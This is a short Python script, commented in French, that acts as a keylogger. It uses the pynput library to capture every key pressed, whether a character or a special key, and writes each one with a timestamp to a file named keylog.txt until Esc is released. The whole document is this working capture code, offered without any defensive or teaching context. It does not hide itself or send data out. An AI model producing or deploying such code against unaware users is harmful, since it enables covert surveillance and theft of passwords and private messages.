# Importation des modules nécessaires
from pynput import keyboard  # Pour écouter les entrées du clavier
import logging  # Pour gérer l'écriture des logs

# Configuration de la journalisation
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    """ 
    Fonction appelée lors de la pression d'une touche. 
    Enregistre le caractère ou le nom de la touche dans le fichier de log. 
    """
    try:
        logging.info(f'{key.char}')  # Enregistre le caractère de la touche
    except AttributeError:
        logging.info(f'{key}')  # Enregistre le nom de la touche si pas de caractère

def on_release(key):
    """ 
    Fonction appelée lors du relâchement d'une touche. 
    Arrête le listener si la touche 'esc' est relâchée. 
    """
    if key == keyboard.Key.esc:
        return False  # Arrête le listener

# Création d'un listener pour les événements de clavier
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Démarre l'écoute des événements
